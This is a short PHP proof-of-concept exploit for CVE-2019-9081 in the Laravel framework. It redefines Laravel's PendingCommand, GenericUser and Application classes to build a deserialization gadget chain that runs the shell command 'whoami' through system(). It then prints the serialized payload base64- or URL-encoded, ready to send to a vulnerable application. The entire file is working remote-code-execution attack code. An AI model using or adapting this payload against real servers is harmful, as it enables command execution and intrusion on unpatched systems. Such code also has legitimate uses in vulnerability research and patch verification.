<?php
/*
Author:monitor
description:
    poc for CVE-2019-9081
*/
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;

        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}

namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances = [];
        public function __construct($instances=[]){
              $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace{
    $genericuser = new Illuminate\Auth\GenericUser(array("expectedQuestions"=>array("0"=>"1"),"expectedOutput"=>array("0"=>"1")));
    $application = new \Illuminate\Foundation\Application();
    $app = new \Illuminate\Foundation\Application($application);
    $pendingcommand = new \Illuminate\Foundation\Testing\PendingCommand("system",array("whoami"),$genericuser,$app);
    if($argc<2){
        echo "Usage:" .$argv[0]. "\n-b  base64_encode\n-u  url_encode";
        exit();
    }
    if ($argv[1]=="-b"){
        echo base64_encode(serialize($pendingcommand));
    }elseif($argv[1]=="-u"){
        echo urlencode(serialize($pendingcommand));
    }
}